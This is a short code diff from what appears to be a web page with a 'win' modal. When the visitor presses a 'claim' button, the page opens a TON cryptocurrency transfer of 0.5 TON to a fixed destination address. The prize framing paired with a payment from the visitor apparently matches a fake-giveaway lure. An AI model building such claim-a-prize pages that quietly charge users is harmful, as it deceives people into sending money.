@@ -304,7 +304,7 @@
             let amount = 0.5 * (10 ** 9);
             let transaction_link = `ton://transfer/${DESTINATION_ADDRESS}?amount=${Number(amount)}`;
             
-            window.location.href = transaction_link;
+            document.getElementById('claimButton').href = transaction_link;
 
             // Close the modal
             document.getElementById('winModal').style.display = 'none';
